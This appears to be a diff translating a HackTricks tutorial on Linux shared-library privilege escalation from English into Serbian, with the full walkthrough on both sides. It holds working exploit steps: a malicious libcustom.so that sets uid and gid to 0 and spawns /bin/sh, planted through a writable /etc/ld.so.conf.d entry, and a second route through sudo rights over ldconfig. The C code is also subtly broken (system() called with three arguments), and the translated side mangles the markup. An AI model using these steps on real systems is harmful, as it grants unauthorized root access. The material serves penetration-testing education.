@@ -1,22 +1,22 @@
-# ld.so privesc exploit example
+# Primer eksploatacije ld.so
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-## Prepare the environment
+## Priprema okruženja
 
-In the following section you can find the code of the files we are going to use to prepare the environment
+U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja
 
 {% tabs %}
 {% tab title="sharedvuln.c" %}
@@ -25,9 +25,9 @@ In the following section you can find the code of the files we are going to use 
 #include "libcustom.h"
 
 int main(){
-    printf("Welcome to my amazing application!\n");
-    vuln_func();
-    return 0;
+printf("Welcome to my amazing application!\n");
+vuln_func();
+return 0;
 }
 ```
 {% endtab %}
@@ -38,52 +38,46 @@ int main(){
 
 void vuln_func();
 ```
-{% endtab %}
-
 {% tab title="libcustom.c" %}
 ```c
 #include <stdio.h>
 
 void vuln_func()
 {
-    puts("Hi");
+puts("Hi");
 }
 ```
+{% tabs %}
+{% tab title="Bash" %}
+1. **Napravite** te datoteke na vašem računaru u istom folderu
+2. **Kompajlirajte** biblioteku: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Kopirajte** `libcustom.so` u `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privilegije)
+4. **Kompajlirajte** izvršnu datoteku: `gcc sharedvuln.c -o sharedvuln -lcustom`
+
+### Proverite okruženje
+
+Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete **izvršiti** binarnu datoteku.
 {% endtab %}
 {% endtabs %}
-
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
-
-### Check the environment
-
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
-
 ```
 $ ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
-	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
-	
-$ ./sharedvuln 
+linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
+libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
+
+$ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
+## Eksploatacija
 
-## Exploit
-
-In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
-
+U ovom scenariju pretpostavljamo da je **neko kreirao ranjiv unos** unutar datoteke u _/etc/ld.so.conf/_:
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-
-The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Download and compile** the following code inside that path:
-
+Ranjiva mapa je _/home/ubuntu/lib_ (gde imamo pristup za pisanje).\
+**Preuzmite i kompajlirajte** sledeći kod unutar tog puta:
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -92,91 +86,82 @@ The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
 #include <sys/types.h>
 
 void vuln_func(){
-    setuid(0);
-    setgid(0);
-    printf("I'm the bad library\n");
-    system("/bin/sh",NULL,NULL);
+setuid(0);
+setgid(0);
+printf("I'm the bad library\n");
+system("/bin/sh",NULL,NULL);
 }
 ```
+Sada kada smo **kreirali zlonamernu libcustom biblioteku unutar pogrešno konfigurisane** putanje, moramo sačekati **ponovno pokretanje** ili da korisnik sa privilegijama root-a izvrši **`ldconfig`** (_u slučaju da možete izvršiti ovu binarnu datoteku kao **sudo** ili ima **suid bit**, moći ćete je izvršiti sami_).
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
-
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
-
+Kada se to dogodi, **ponovo proverite** odakle se `sharevuln` izvršna datoteka učitava iz biblioteke `libcustom.so`:
 ```c
 $ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffeee766000)
-	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
+linux-vdso.so.1 =>  (0x00007ffeee766000)
+libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-
-As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:
-
+Kao što možete videti, **učitava se iz `/home/ubuntu/lib`** i ako ga bilo koji korisnik izvrši, izvršiće se shell:
 ```c
-$ ./sharedvuln 
+$ ./sharedvuln
 Welcome to my amazing application!
 I'm the bad library
 $ whoami
 ubuntu
 ```
-
 {% hint style="info" %}
-Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
+Napomena da u ovom primeru nismo povećali privilegije, ali modifikovanjem izvršenih komandi i **čekanjem da korisnik sa privilegijama izvrši ranjivu binarnu datoteku** možemo povećati privilegije.
 {% endhint %}
 
-### Other misconfigurations - Same vuln
+### Ostale loše konfiguracije - Ista ranjivost
 
-In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
+U prethodnom primeru smo lažirali lošu konfiguraciju gde je administrator **postavio folder bez privilegija unutar konfiguracione datoteke unutar `/etc/ld.so.conf.d/`**.\
+Ali postoje i druge loše konfiguracije koje mogu izazvati istu ranjivost, ako imate **dozvole za pisanje** u nekoj **konfiguracionoj datoteci** unutar `/etc/ld.so.conf.d`, u folderu `/etc/ld.so.conf.d` ili u datoteci `/etc/ld.so.conf`, možete konfigurisati istu ranjivost i iskoristiti je.
 
-## Exploit 2
+## Eksploatacija 2
 
-**Suppose you have sudo privileges over `ldconfig`**.\
-You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
-So, lets create the files and folders needed to load "/tmp":
-
+**Pretpostavimo da imate sudo privilegije nad `ldconfig`**.\
+Možete navesti `ldconfig` **odakle da učita konfiguracione datoteke**, tako da možemo iskoristiti to da `ldconfig` učita proizvoljne foldere.\
+Dakle, kreirajmo potrebne datoteke i foldere da bismo učitali "/tmp":
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-
-Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
-And finally, lets load the path and check where is the binary loading the library from:
-
+Sada, kao što je naznačeno u **prethodnom eksploitu**, **kreirajte zlonamernu biblioteku unutar `/tmp`**.\
+I na kraju, učitajte putanju i proverite odakle se binarna datoteka učitava biblioteka:
 ```bash
 ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007fffa2dde000)
-	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+linux-vdso.so.1 =>  (0x00007fffa2dde000)
+libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-
-**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
+**Kao što možete videti, imajući sudo privilegije nad `ldconfig`-om, možete iskoristiti istu ranjivost.**
 
 {% hint style="info" %}
-I **didn't find** a reliable way to exploit this vuln if `ldconfig` is configured with the **suid bit**. The following error appear: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
+**Nisam pronašao** pouzdan način za iskorišćavanje ove ranjivosti ako je `ldconfig` konfigurisan sa **suid bitom**. Pojavljuje se sledeća greška: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
 {% endhint %}
 
-## References
+## Reference
 
 * [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
 * [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
-* Dab machine in HTB
+* Dab mašina na HTB-u
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini da podržite HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
